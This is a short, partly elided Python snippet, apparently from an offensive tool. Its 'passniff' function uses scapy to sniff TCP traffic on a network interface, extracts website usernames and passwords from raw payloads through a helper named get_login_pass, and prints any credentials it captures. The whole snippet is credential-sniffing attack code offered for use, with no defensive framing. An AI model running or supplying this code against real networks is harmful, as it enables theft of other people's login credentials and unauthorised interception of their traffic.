...
def passniff():
	...
	if option1 == 2:
		...
		def pkt_parser(packet):
			if packet.haslayer(scapy.layers.inet.TCP) and packet.haslayer(str(scapy.packet.Raw)) and packet.haslayer(scapy.layers.inet.IP):
				body = str(packet[scapy.layers.inet.TCP].payload)
				user_pass = get_login_pass(body)
				if user_pass != None:
					print(c("[----] Website Login: " + packet[scapy.layers.inet.TCP].payload, "green"))
		...
		try:
			scapy.sendrecv.sniff(iface = iface, prn = pkt_parser, store = 0)
		except KeyboardInterrupt:
			print(c("[----] Exiting", "red"))
			exit(0)
